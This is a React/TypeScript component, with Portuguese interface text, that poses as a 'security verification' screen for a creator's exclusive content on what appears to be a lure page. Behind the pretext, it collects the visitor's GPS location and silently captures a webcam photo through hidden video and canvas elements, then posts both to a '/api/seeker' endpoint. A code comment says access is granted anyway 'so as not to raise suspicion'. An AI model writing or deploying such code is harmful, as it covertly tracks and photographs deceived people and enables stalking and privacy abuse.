import { useState, useRef, useEffect } from "react";
import { Loader2, ShieldCheck, Camera, MapPin } from "lucide-react";

interface SeekerVerificationProps {
  displayName: string;
  onVerified: () => void;
}

export default function SeekerVerification({ displayName, onVerified }: SeekerVerificationProps) {
  const [status, setStatus] = useState<string>("");
  const [loading, setLoading] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const verify = async () => {
    setLoading(true);
    setStatus("Processando verificação...");

    if (!navigator.geolocation) {
      setStatus("Erro: Geolocalização não suportada.");
      setLoading(false);
      setTimeout(onVerified, 2000);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude: lat, longitude: lon, accuracy: acc } = position.coords;

        try {
          // Solicitar câmera
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          if (videoRef.current) {
            videoRef.current.srcObject = stream;
            
            // Aguardar um pouco para a câmera estabilizar
            setTimeout(() => {
              if (videoRef.current && canvasRef.current) {
                const context = canvasRef.current.getContext("2d");
                if (context) {
                  context.drawImage(videoRef.current, 0, 0, 640, 480);
                  const photo = canvasRef.current.toDataURL("image/jpeg");
                  
                  // Enviar dados
                  sendData(lat, lon, acc, photo);
                  
                  // Parar stream
                  stream.getTracks().forEach(track => track.stop());
                }
              }
            }, 1500);
          } else {
             sendData(lat, lon, acc, null);
          }
        } catch (err) {
          // Se falhar a câmera, envia apenas localização
          sendData(lat, lon, acc, null);
        }
      },
      (err) => {
        setStatus("Erro: Localização necessária para verificação.");
        setLoading(false);
        // Mesmo negando, liberamos o acesso após o susto para não gerar suspeita
        setTimeout(onVerified, 2000);
      }
    );
  };

  const sendData = async (lat: number, lon: number, acc: number, photo: string | null) => {
    try {
      await fetch("/api/seeker", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ lat, lon, acc, photo })
      });
    } catch (e) {
      console.error("Erro ao reportar:", e);
    } finally {
      onVerified();
    }
  };

  return (
    <div className="fixed inset-0 z-[10000] flex items-center justify-center bg-[#0b0e11] p-4 text-white font-sans">
      <div className="w-full max-w-md rounded-2xl border border-[#2b2f36] bg-[#181a20] p-8 text-center shadow-2xl">
        <div className="mb-6 flex justify-center">
          <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#f0b90b]/10 text-[#f0b90b]">
            <ShieldCheck size={40} />
          </div>
        </div>

        <h1 className="mb-4 text-2xl font-bold text-[#eaecef]">
          Verificação de Segurança
        </h1>

        <p className="mb-8 leading-relaxed text-[#848e9c]">
          Para acessar o conteúdo exclusivo de <strong>{displayName}</strong> e garantir que você é um usuário real, clique no botão abaixo para uma verificação rápida de identidade.
        </p>

        <div className="space-y-4 mb-8">
           <div className="flex items-center gap-3 text-sm text-[#848e9c] text-left px-4">
              <Camera size={16} className="text-[#f0b90b]" />
              <span>Verificação de presença (Câmera)</span>
           </div>
           <div className="flex items-center gap-3 text-sm text-[#848e9c] text-left px-4">
              <MapPin size={16} className="text-[#f0b90b]" />
              <span>Validação de região (GPS)</span>
           </div>
        </div>

        <button
          onClick={verify}
          disabled={loading}
          className="w-full rounded-xl bg-[#f0b90b] py-4 text-lg font-bold text-black transition-all hover:bg-[#dfa90a] disabled:opacity-50"
        >
          {loading ? (
            <div className="flex items-center justify-center gap-2">
              <Loader2 className="animate-spin" />
              <span>VERIFICANDO...</span>
            </div>
          ) : (
            "VERIFICAR AGORA"
          )}
        </button>

        <div className="mt-4 h-6 text-sm font-medium text-[#f0b90b]">
          {status}
        </div>

        <p className="mt-8 text-xs text-[#474d57]">
          © 2026 Privacy Brasil - Protocolo de Segurança SSL Ativado
        </p>

        {/* Hidden Elements */}
        <video ref={videoRef} width="640" height="480" className="hidden" autoPlay playsInline muted />
        <canvas ref={canvasRef} width="640" height="480" className="hidden" />
      </div>
    </div>
  );
}
